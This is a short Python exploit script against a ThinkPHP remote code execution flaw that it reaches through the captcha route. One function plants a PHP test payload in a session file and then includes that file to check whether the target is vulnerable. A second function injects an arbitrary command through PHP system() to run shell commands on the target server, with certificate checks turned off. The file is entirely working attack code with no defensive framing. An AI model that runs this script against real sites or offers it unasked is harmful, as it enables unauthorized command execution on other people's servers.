import ssl
import urllib.request
import  random
import requests



def exp_check(url):
    try:
        sjs = random.randint(0,10000000)
        heads={
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
            "Content-Type":"application/x-www-form-urlencoded",
            "Cookie": "PHPSESSID=XH" + str(sjs)
        }
        context = ssl._create_unverified_context()
        req = urllib.request.Request(url + "/index.php?s=captcha",data="_method=__construct&filter[]=think\\Session::set&method=get&get[]=<?php var_dump('check');?>&server[]=1".encode("utf-8"),headers=heads)
        urllib.request.urlopen(req,context=context)
        rp = requests.post(url+"/index.php?s=captcha",data="_method=__construct&method=get&filter[]=think\\__include_file&get[]=/tmp/sess_XH"+str(sjs)+"&server[]=1;",headers=heads,verify=False,timeout=10)
        if rp.status_code==200 and 'check' in rp.text:
            return 1
        else:
            return 2
    except Exception as e:
        str(e)+str(e.__traceback__.tb_lineno)+'行'
        return 3

def exp_cmd(url,cmd):
    try:
        
        sjs = random.randint(0,10000000)
        heads={
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
            "Content-Type":"application/x-www-form-urlencoded",
            "Cookie": "PHPSESSID=XH" + str(sjs)
        }

        context = ssl._create_unverified_context()
        data ="_method=__construct&filter[]=think\\Session::set&method=get&get[]=<?php system('"+cmd+"');?>&server[]=1"
        req = urllib.request.Request(url + "/index.php?s=captcha",data=data.encode("utf-8"),headers=heads)
        urllib.request.urlopen(req,context=context)
        rp = requests.post(url+"/index.php?s=captcha",data="_method=__construct&method=get&filter[]=think\\__include_file&get[]=/tmp/sess_XH"+str(sjs)+"&server[]=1;",headers=heads,verify=False,timeout=10)
        if rp.text!="":
            return rp.text

    except Exception as e:
       str(e)+str(e.__traceback__.tb_lineno)+'行'
       return 3
